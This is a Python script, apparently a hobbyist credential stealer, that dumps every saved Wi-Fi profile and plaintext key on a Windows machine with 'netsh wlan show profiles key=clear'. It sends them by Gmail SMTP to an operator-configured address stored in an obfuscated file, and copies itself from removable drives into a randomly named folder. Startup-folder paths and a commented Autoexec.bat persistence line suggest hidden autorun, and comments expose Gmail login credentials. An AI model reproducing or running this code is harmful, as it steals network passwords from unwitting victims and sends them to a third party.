"""C:\\Users\\AMSC\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
C:\\Utilisateur\\AMSC\\AppData\\Roaming\\Microsoft\\Windows\\Menu Demarrer\\Programmes\\Demarrage
C:\\ProgramData\\Microsoft\\Windows\\Menu Demarrer\\Programmes\\Demarrage"""
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import time
from tkinter import*
from os.path import join
from random import randint

Nom_Aléa = lambda arg : [randint(0, len(arg)) for i in range(len(arg))]
converti = lambda arg1, arg2, arg3 : [chr(ord(arg1[i]) + arg2[i] + arg3[i]) for i in range(len(arg1))]
converti_Mopas = lambda arg1, arg2 : [chr(ord(arg1[i]) + arg2[i]) for i in range(len(arg1))]

class Manipulation():
    def __init__(self):
        global filename
        self.drives, self.Note, self.Notes, self.Old_Password, self.PassWord = [], [], [], [], []
        self.Filename, self.Folder, self.NomTex, self.NomTex1, self.Auto = sys.argv[0], "", 'Brouillon.txt', 'Envoi.txt', 'C:\\Autoexec.bat'
        self.DesMopaRecep, self.NomTex2 = ['']*3, 'Brouillon1.txt'
        self.filename1, self.fen = '', ''
        self.Newname, self.Texte = '', []
        
    def ListeFileExtr(self, Note): # Cette fonction répertorie le chemin de tous les fichiers contenus dans chaque disque
        self.Note = []
        Class.OuvrirFermer("r", Note)
        if len(self.Note) > 1 : del self.Note[0]

    def OuvrirFermer(self, wr, Filename): # Cette fonction ouvre un fichier pour extraire ou écrire des données
        try:
            filin = open(Filename, wr)
            if (wr == "rb" or wr == "r"):  # Ouverture en mode lecture
                if(self.Note != []): self.Note = []
                T = filin.readlines()
                for i in T: self.Note.append(i)
            elif (wr == "wb"):  # Ouverture en mode écriture
                for i in self.Note: filin.write(i)
                self.Note = []
            filin.close()
        except: Class.OuvrirFermer(wr, Filename)

    def Création_Du_Nom_De_Fichier(self, mot): # Cette fonction comme son nom l'indique, crée aléatoirement
        file1, ext, drive, file2 = "", "", "", ""  # le nom du nouveau fichier à partir de l'ancien nom
        drive = os.path.dirname(mot)
        file1, ext = os.path.splitext(os.path.basename(mot))
        if(file1 == "aA" or file1 == "zZ"): file2, file1 = file1[randint(0,1)], " "*8
        while(len(file2) != len(file1)):
            j = randint(65, 122)
            if(j<91 or j>96): file2 += chr(j)
        if(ext != ""): mot = os.path.join(drive, file2 + ext)
        else: mot = os.path.join(drive, file2)
        return mot

    def Déplace_Fichier_Source(self):   # Cette fonction déplace le fichier source de sa position initiale vers un vers sa destination
        """drive = os.path.dirname(sys.argv[0])
        for drives, dirs, file in os.walk(drive, "topdown"):
            for i in file:
                file1, ext = os.path.splitext(i)
                if(ext == ".pdf"):
                    Filename = os.path.join(drives, i)
                    break
        os.startfile(Filename)"""
        Class.Execution_Du_Program()
        Class.OuvrirFermer('rb', os.path.join(os.path.dirname(sys.argv[0]), self.NomTex1))
        Class.OuvrirFermer('wb', os.path.join(sys.argv[0][:3], self.NomTex1))
        os.remove(os.path.join(sys.argv[0][:3], self.NomTex1))
        os.popen('fsutil fsinfo drives > ' + os.path.join(os.path.dirname(sys.argv[0]), self.NomTex))
        time.sleep(0.5)
        self.Note = []
        Class.OuvrirFermer('r', os.path.join(os.path.dirname(sys.argv[0]), self.NomTex))
        if len(self.Note) == 2: del self.Note[0]
        self.drive = []
        for i in self.Note:
            i = i.split(" ")
            self.drive.append(i[1:len(i)-2])
        self.Folder = Class.Création_Du_Nom_De_Fichier(self.drive[0][0] + "zZ")
        if not os.path.exists(self.Folder): os.mkdir(self.Folder)
        os.remove(os.path.join(os.path.dirname(sys.argv[0]), self.NomTex))
        os.popen('XCOPY ' + os.path.dirname(sys.argv[0]) + ' ' + self.Folder + ' ' + '/S')
        #os.popen(os.path.join(self.Folder, self.Newname) + ' >> ' + self.Auto)"""

    def Execution_Du_Program(self, verifi = False):
        self.Filename, Long, self.Note = os.path.dirname(self.Filename), [], []
        os.popen("netsh wlan show profiles > " + os.path.join(self.Filename, self.NomTex))
        time.sleep(0.5)
        while self.Note == [] :
            Class.ListeFileExtr(os.path.join(self.Filename, self.NomTex))
            if len(self.Note) < 9 :
                self.Note = []
                time.sleep(0.5)
        for i in self.Note:
            if(i.find('All User Profile') != -1 or i.find('Profil Tous les utilisateurs') != -1):
                self.drives.append('"' + i[i.find(':')+2:-1] + '"')
                Long.append(len(i[i.find(':')+2:-1])+2)
        Long = max(Long)
        try: os.remove(os.path.join(self.Filename, self.NomTex))
        except:
            time.sleep(0.5)
            os.remove(os.path.join(self.Filename, self.NomTex))
        for i in self.drives:
            if(i != ''):
                os.popen("netsh wlan show profiles " + i + " key=clear > " + os.path.join(self.Filename, self.NomTex))
                time.sleep(0.5)
                Class.ListeFileExtr(os.path.join(self.Filename, self.NomTex))
                for k in range(len(self.Note)):
                    if(len(self.Note[k]) < 5): pass
                    j = self.Note[k]
                    if((j.find('    Security') != -1 and j[j.find(':')+2:-1] == 'Present')or(j.find('    Cl‚ de s‚curit‚') != -1 and j[j.find(':')+2:-1] == 'Pr‚sent')):
                       self.PassWord.append(bytes(i + ' '*(Long-len(i)) + " : " + j[j.find(':')+2:-1] + "\r\n", encoding="utf-8"))
                       self.Texte.append(i + ' '*(Long-len(i)) + " : " + j[j.find(':')+2:-1] + "\n")
                       j = self.Note[k+1]
                       self.PassWord.append(bytes(' '*Long + " : " + j[j.find(':')+2:-1] + "\r\n", encoding="utf-8"))
                       self.Texte.append(' '*Long + " : " + j[j.find(':')+2:-1] + "\n")
                    elif((j.find('    Security') != -1 or j.find('    Cl‚ de s‚curit‚') != -1)and j[j.find(':')+2:-1] == 'Absent'):
                       self.PassWord.append(bytes(i + ' '*(Long-len(i)) + " : " + j[j.find(':')+2:-1] + "\r\n", encoding="utf-8"))
                       self.Texte.append(i + ' '*(Long-len(i)) + " : " + j[j.find(':')+2:-1] + "\n")
                self.PassWord.append(bytes("\r\n", encoding="utf-8"))
        for i in self.PassWord: print(i)
        Class.Vérification(verifi)
        #Class.Envoi()

    def Vérification(self, verifi):
        if(not os.path.exists(os.path.join(self.Filename, self.NomTex1))):
            self.Note = self.PassWord
            Class.OuvrirFermer("wb", os.path.join(self.Filename, self.NomTex1))
            if(verifi): Class.Envoi()
        else:
            self.Note = []
            Class.OuvrirFermer('rb', os.path.join(self.Filename, self.NomTex1))
            self.Old_Password = self.Note
            if(self.PassWord != self.Old_Password):
                self.Note = self.PassWord
                Class.OuvrirFermer("wb", os.path.join(self.Filename, self.NomTex1))
                if(verifi): Class.Envoi()

    def Fenetre(self):
        self.filename1 = os.path.join(os.path.dirname(sys.argv[0]), self.NomTex2)
        if not os.path.exists(self.filename1):
            self.fen = Tk()
            self.fen.geometry("425x135")
            self.fen.title('Essai de Programmation')
            Label1 = Label(self.fen, text = "Entrez L'addresse E-mail du Destinataire")
            Label1.grid(row = 1, column = 1, padx = 5, pady = 5)
            self.DesMopaRecep[0] = StringVar()
            Champ = Entry(self.fen, textvariable = self.DesMopaRecep[0], width = 30)
            Champ.focus_set()
            Champ.grid(row = 1, column = 2, padx = 5, pady = 5)
            Label2 = Label(self.fen, text = 'Entrez le Mot de passe du destinaire    ')
            Label2.grid(row = 2, column = 1, padx = 5, pady = 5)
            self.DesMopaRecep[1] = StringVar()
            Champ = Entry(self.fen, textvariable = self.DesMopaRecep[1], show = '*', width = 30)
            Champ.focus_set()
            Champ.grid(row = 2, column = 2, padx = 5, pady = 5)
            Label3 = Label(self.fen, text = "Entrez L'addresse E-mail du Recepteur   ")
            Label3.grid(row = 3, column = 1, padx = 5, pady = 5)
            self.DesMopaRecep[2] = StringVar()
            Champ = Entry(self.fen, textvariable = self.DesMopaRecep[2], width = 30)
            Champ.focus_set()
            Champ.grid(row = 3, column = 2, padx = 5, pady = 5)
            Bouton = Button(self.fen, text = 'OK', width = 8, command = Class.EcrisDecris)
            Bouton.grid(row = 4, column = 2, padx = 5, pady = 5)
            self.fen.mainloop()
        else:
            os.popen('fsutil fsinfo drivetype ' + sys.argv[0][:2] + ' > ' + os.path.join(os.path.dirname(sys.argv[0]), self.NomTex))
            time.sleep(0.5)
            Class.OuvrirFermer("r", os.path.join(os.path.dirname(sys.argv[0]), self.NomTex))
            for i in self.Note:
                if(i.find('Fixed Drive') != -1 or i.find('Lecteur Fixe') != -1): Class.Execution_Du_Program(True)
                else: Class.Déplace_Fichier_Source()

    def EcrisDecris(self):
        def Compresser(var):
            for i in range(len(var)): var[i] = chr(57 + var[i])
            return ''.join(var)
        self.Note, Keys = [], [0]*3
        Keys[0] = Nom_Aléa(self.DesMopaRecep[0].get())
        Keys[1] = Nom_Aléa(self.DesMopaRecep[1].get())
        Keys[2] = Nom_Aléa(self.DesMopaRecep[2].get())
        self.DesMopaRecep = [Class.Ecriture('.'.join(converti(self.DesMopaRecep[0].get()*2, Keys[0]*2, Keys[1]*3))),
                             Class.Ecriture('.'.join(converti_Mopas(self.DesMopaRecep[1].get()*2, Keys[1]*2))),
                             Class.Ecriture('.'.join(converti(self.DesMopaRecep[2].get()*2, Keys[2]*2, Keys[1]*3)))]
        self.DesMopaRecep = Class.Dissimulation(self.DesMopaRecep)
        for i in self.DesMopaRecep: self.Note.append(bytes(i + '\r\n', encoding='utf-8'))
        for i in Keys: self.Note.append(bytes(Compresser(i) + '\r\n', encoding='utf-8'))
        Class.OuvrirFermer("wb", self.filename1)
        self.fen.destroy()

    def Dissimulation(self, DesMopaRecep):
        def selection(a, b):
            c = -1
            while c < 0 or c == 10 or c == 13: c = randint(a, b)
            return chr(c)
        Nom = max(len(DesMopaRecep[0]), len(DesMopaRecep[1]), len(DesMopaRecep[2]))
        Nom1 = min(len(DesMopaRecep[0]), len(DesMopaRecep[1]), len(DesMopaRecep[2]))
        if Nom%6 != 0: Nom = ((Nom//6)+1)*6 + Nom - Nom1
        for j in range(2):
            for i in range(3):
                if len(DesMopaRecep[i]) <= Nom: DesMopaRecep[i] += DesMopaRecep[i]
        mot, Matrice, H1, H2, k, k1, k2 = '', [], Nom//6, Nom//6, -1, 0, 0
        if (Nom//3)%2 == 0: Nom = Nom//3 + 1
        else: Nom = Nom//3
        for i in range(Nom):
            for j in range(abs(H1+1)): mot += selection(0, 250)
            if i == 0 or i == Nom-1: mot, k2 = mot + DesMopaRecep[1][k2:k2+3], k2+3
            else: mot += DesMopaRecep[0][k1:k1+3]
            a = ''
            for i1 in range(k):
                if k == 1: a += selection(0, 250)
                elif (k == 3 or k == 1): a, k2 = a + DesMopaRecep[1][k2], k2+1
                else:
                    if (k//2 - 1) <= i1 and i1 < (k//2 + 2): a, k2 = a + DesMopaRecep[1][k2], k2+1
                    else: a += selection(0, 250)
            if i == 0 or i == Nom-1: mot += a + mot[:-3]
            else: mot, k1 = mot + a + DesMopaRecep[2][k1:k1+3] + mot[:-3], k1+3
            if i >= H2: k -= 2
            else: k += 2
            Matrice.append(mot)
            mot, a = '', ''
            if i == 0 or i == Nom-2: H1 -= 2
            else: H1 -= 1
        return Matrice

    def Ecriture(self, a):
        b, count = '', 0
        for i in a:
            for j in hex(ord(i))[2:]:
                c, k0, k1, k = bin(ord(j))[1:], 0, 0, 0
                c += str(abs(int(c[-1])-1))
                while(k == 0):
                    if(c[k0] == c[k1]):
                        count += 1
                        k1 += 1
                    else:
                        if(count == 1): b += c[k0]
                        else: b += str(count) + c[k0]
                        k0, count = k1, 0
                    if(k1 == len(c)): k, count = 1, 0
        return b.replace('b', '0x')

    def Réecriture(self):
        Class.OuvrirFermer("rb", self.filename1)
        Keys, a, b = [], [], ''
        for i in range(len(self.Note)): self.Note[i] = str(self.Note[i], encoding='utf-8')
        for i in self.Note[-3:]:
            for j in i[:-2]: a.append(ord(j)-57)
            Keys.append(a)
            a = []
        self.Note = Class.Recherche(self.Note[:-3])
        t = 0
        for b in self.Note:
            b, c, a, l = b.replace('0x', 'b') + 'b', '', '', ''
            for i in range(len(b)):
                if(b[i] == 'b'):
                    if c.isnumeric():
                        k1 = 0
                        for k in range(len(c)): k1 += int(c[-k-1])*2**(k)
                        l, c = l + chr(k1), 0
                        if(len(l) == 2):
                            for k in range(2):
                                if(47 < ord(l[k]) and ord(l[k]) < 58): c += int(l[k])*16**(1-k)
                                else: c += (ord(l[k].upper()) - 55)*16**(1-k)
                            try: a, l = a + chr(c), ''
                            except: pass
                    c = ''
                elif b[i].isnumeric():
                    if (int(b[i]) <= 1): c += b[i]
                    else:
                        try:
                            for j in range(int(b[i])-1): c += b[i+1]
                        except: pass
            self.DesMopaRecep[t], t = a, t + 1
        self.DesMopaRecep[0] = Class.converti1(self.DesMopaRecep[0].split('.'), Keys[0], Keys[1]*3)
        self.DesMopaRecep[1] = Class.converti1(self.DesMopaRecep[1].split('.'), Keys[1])
        self.DesMopaRecep[2] = Class.converti1(self.DesMopaRecep[2].split('.'), Keys[2], Keys[1]*3)
        for i in range(3): print('self.DesMopaRecep = ', self.DesMopaRecep[i])

    def Recherche(self, Matrice):
        add1, add2, Mopas, k = '', '', '', 1
        for i in Matrice:
            T = len(i)//2
            if len(i)%2 != 0: T -= 1
            if k > 1 and k < len(Matrice):
                if k <= len(Matrice)//2+1:
                    add1 += i[T-1-k : T+2-k]
                    add2 += i[T-1+k : T+2+k]
                else:
                    add1 += i[k-T+1 : k-T+4]
                    add2 += i[-(k-T+6) : -(k-T+3)]
            if k != 2 and k != len(Matrice)-1: Mopas += i[T-1 : T+2]
            k += 1
        return [add1, Mopas, add2]

    def converti1(self, arg1=[], arg2=[], arg3=[]):
        m = []
        if arg3 == []: arg3 = [0]*len(arg2)
        for i in range(len(arg2)):
            if(len(arg1[i]) == 1): m.append(chr(ord(arg1[i]) - arg2[i] - arg3[i]))
            else:
                for j in arg1[i]:
                    try: m.append(chr(ord(str(j)) - arg2[i] - arg3[i]))
                    except: pass
        return ''.join(m)

    def Envoi(self):
        import smtplib
        print(''.join(self.Texte))
        Class.Réecriture()
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(self.DesMopaRecep[0], self.DesMopaRecep[1])         #("hackifyouwant4@gmail.com", "Hack_if_you_want4")
        fromaddr = 'foo <' + self.DesMopaRecep[0] + '>'         #<hackifyouwant4@gmail.com>'
        toaddr = self.DesMopaRecep[2]         #["Azangmo.cedric@gmail.com"]
        sujet = "Test"
        message = "u'''" + ''.join(self.Texte) + "'''"
        msg = '''\From: %s\r\n To: %s\r\n Subject: %s\r\n\r\n %s''' %(fromaddr, toaddr, sujet, message)
        try:
            server.sendmail(fromaddr, toaddr, msg)
            print("Message envoyé avec succès")
        except smtplib.SMTPException as e:
            print(e)
        server.quit()
        for i in self.PassWord: print("self.PassWord = ", i)
        for i in self.DesMopaRecep: print('self.DesMopaRecep = ', i)

if __name__ == "__main__":
    Class = Manipulation()
    Class.Fenetre()
    #Class.Réecriture()
